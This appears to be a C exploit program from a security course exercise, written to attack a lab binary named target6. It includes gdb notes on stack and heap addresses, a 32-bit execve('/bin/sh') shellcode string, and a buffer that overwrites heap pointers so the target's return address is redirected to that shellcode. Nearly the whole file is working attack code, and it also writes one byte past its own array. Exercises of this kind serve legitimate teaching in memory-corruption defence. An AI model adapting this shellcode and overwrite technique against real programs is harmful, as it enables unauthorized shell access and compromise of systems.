#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

/*
(gdb) info frame
  Stack level 0, frame at 0x3021feb0:
  rip = 0x401146 in foo (target6.c:25); saved rip = 0x401220
  called by frame at 0x3021fed0
  source language c.
  Arglist at 0x3021fea0, args: arg=0x7fffffffd7b2 "test"
  Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
  Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8
(gdb) p &q
  $4 = (char **) 0x3021fe90
(gdb) p &p
  $5 = (char **) 0x3021fe98
(gdb) x 0x3021fe98
  0x3021fe98:     0x0104ec48
(gdb) x 0x3021fe90
  0x3021fe90:     0x0104ec98

return address in 0x3021fea8, p in 0x0104ec48, q in 0x0104ec98
there has 80 bytes between p & q
*/

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[128];
  //we need to modify the first line of the shell code which jump to 0x25
  char shellcode[] =
  "\xeb\x25\x90\x90\x91\x90\x90\x90\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
  
  for(int i = 0; i < 128; i++)
    buf[i] = 0x90;

  for(int i = 0; i < strlen(shellcode); i++)
    buf[i] = shellcode[i];
  //pre of fake q, points to start of the shellcode
  buf[72] = 0x48;
  buf[73] = 0xec;
  buf[74] = 0x04;
  buf[75] = 0x01;

  buf[76] = 0xa8;//point to return value
  buf[77] = 0xfe;
  buf[78] = 0x21;
  buf[79] = 0x30;

  buf[128] = 0x00;

  args[0] = TARGET; 
  args[1] = buf; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
